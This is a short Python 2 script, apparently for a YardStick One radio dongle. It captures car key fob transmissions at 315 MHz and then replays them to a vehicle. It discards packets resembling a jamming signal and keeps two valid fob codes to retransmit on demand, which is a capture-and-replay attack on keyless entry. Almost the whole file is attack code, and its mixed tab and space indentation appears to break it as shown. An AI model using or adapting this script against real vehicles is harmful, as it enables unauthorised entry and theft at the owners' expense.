"""
    Credit to GhostLulz and Trishmapow (Chris) on Github
"""


from rflib import *
import sys
import bitstring
import time


d = RfCat(idx=0)
d.setFreq(315000000) #315MHz
d.setMdmModulation(MOD_2FSK) #2FSK modulation
d.setMdmDRate(5000) #5k baud
d.setMdmChanBW(125000) #125k channel bandwidth
d.setMdmChanSpc(200000)
d.setMdmSyncMode(1) #What is this?
d.setMdmSyncWord(0xaaaa) #Sync word
d.setMaxPower() # max power
d.lowball(1) # need inorder to read data
d.makePktFLEN(100)

rawCapture = [] # array to store keyfob captures
i=0
while True:
	try:
		if i >=2: # number of packets to capture
			break;		
		raw,t=d.RFrecv(timeout=1)
		rawInHex=raw.encode('hex') # turn to hex

		print rawInHex.count('f') # output in case jammed packet

        if (rawInHex.count('f') < 350): # filter the jamming signal
            print str(rawInHex) # print key fob packet
            rawCapture.append(rawInHex) # add key fob to array
            i= i +1
	except ChipconUsbTimeoutException: # had to add this yard stick one kept timming out
		pass


for i in range(0,len(rawCapture)): # loop through each key fob capture
        raw_input("enter"+str(i+1))
        key_packed = bitstring.BitArray(hex=rawCapture[i]).tobytes() # get the length of the packet 
        d.makePktFLEN(len(key_packed)) # set packet length
        d.RFxmit(key_packed) # replay packet to car
d.setModeIDLE() # put yardstick one in idle mode